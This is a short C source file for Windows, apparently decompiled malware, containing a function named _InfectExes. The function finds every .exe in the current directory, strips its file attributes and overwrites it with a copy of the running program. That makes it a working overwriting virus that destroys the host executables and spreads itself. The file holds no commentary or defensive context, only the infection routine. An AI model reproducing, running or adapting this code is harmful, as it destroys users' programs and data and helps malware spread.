#include "data_globals.h"
#include <windows.h>
#include <stdint.h>

uint32_t _InfectExes(void)
{
    uint32_t result;
    BOOL success;
    char current_exe_path[256];
    WIN32_FIND_DATAA file_data;
    HANDLE find_handle;

    GetModuleFileNameA(NULL, current_exe_path, sizeof(current_exe_path));
    find_handle = FindFirstFileA("*.exe", &file_data);

    if (find_handle == INVALID_HANDLE_VALUE)
    {
        result = 1;
    }
    else
    {
        SetFileAttributesA(file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
        CopyFileA(current_exe_path, file_data.cFileName, FALSE);

        while (TRUE)
        {
            success = FindNextFileA(find_handle, &file_data);
            if (success == 0) break;
            SetFileAttributesA(file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
            CopyFileA(current_exe_path, file_data.cFileName, FALSE);
        }

        FindClose(find_handle);
        result = 0;
    }
    return result;
}
